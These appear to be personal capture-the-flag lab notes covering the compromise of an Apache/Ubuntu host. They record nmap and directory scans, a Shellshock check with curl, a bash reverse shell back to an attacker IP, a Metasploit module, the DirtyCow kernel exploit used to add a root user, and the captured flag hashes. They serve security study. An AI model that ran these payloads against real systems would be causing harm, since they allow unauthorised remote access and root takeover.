nmap
```php
nmap -sV -sC -p- -oN nmapinit.txt $IP
```

```php
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-05 07:21 BST
Nmap scan report for 192.168.247.87
Host is up (0.021s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 06:cb:9e:a3:af:f0:10:48:c4:17:93:4a:2c:45:d9:48 (DSA)
|   2048 b7:c5:42:7b:ba:ae:9b:9b:71:90:e7:47:b4:a4:de:5a (RSA)
|_  256 fa:81:cd:00:2d:52:66:0b:70:fc:b8:40:fa:db:18:30 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesnt have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.88 seconds
```

feroxbuster
```php
feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -u http://192.168.247.87/ -d 2 -C 404 
```

nikto
```php
nikto -h <url>
```
- reveals shellshock vulnerability

confirming shellshock
```php
curl -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" http://192.168.247.87/cgi-bin/test/test.cgi
```

![[img/Pasted image 20241005074659.png]]

rev-shell
```php
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.45.231/9001 0>&1' http://192.168.247.87/cgi-bin/test/test.cgi  
```

local.txt
```php
cat /usr/lib/cgi-bin/local.txt
```
- first flag is in the home directory of the web-shell
- `be53b8c1743c916a00cc3992bc390a09`

Metasploit

```php
msfconsole
search apache cgi 
use 8
set TARGETURI /cgi-bin/test
set RHOST
set LHOST tun0
```
- `exploit(multi/http/apache_mod_cgi_bash_env_exec)`

Linpeas has a high probability for the kernel exploit dirtycow: https://www.exploit-db.com/exploits/40839?source=post_page-----48b961a4c6ea--------------------------------

```php
upload /home/kali/Transfer/40839.c
```
- drop into a normal shell `shell`

```php
gcc -pthread 40839.c -o dirty -lcrypt
```

```php
./dirty 123
```

ssh into new user
```php
ssh firefart@192.168.247.87 
```
- enter new password `123`

cat /root/proof.txt
`6f7072176334be50fc70cb23eaafba81`

![[img/Pasted image 20241005090233.png]]

---

**Completed:** _08:58 2024-10-05_

